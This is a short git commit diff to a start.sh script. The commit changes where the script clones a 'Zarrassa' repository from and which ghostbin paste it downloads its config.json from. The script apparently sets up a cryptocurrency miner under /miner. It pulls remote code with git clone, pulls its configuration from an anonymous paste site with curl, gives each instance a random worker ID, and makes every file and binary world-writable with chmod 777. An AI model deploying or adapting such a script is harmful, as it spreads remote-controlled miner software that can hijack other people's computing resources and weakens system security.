c6a686cfc85945bb25564309691190bb2559ee3a
martinezkenneth886 <95105517+martinezkenneth886@users.noreply.github.com>
2021-11-27 00:20:14 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,11 +4,11 @@ dmesg
 mv /miner temp1
 mkdir /miner
 cd /miner
-git clone https://github.com/Mzikoa21/Zarrassa.git
+git clone https://github.com/martinezkenneth886/Zarrassa.git
 cd Zarrassa
 rm config.json
 NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
-curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
+curl https://ghostbin.com/K192K/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
 chmod 777 /miner/*
 chmod 777 /miner/Zarrassa/*
 chmod 777 /miner/Zarrassa/binaries/*
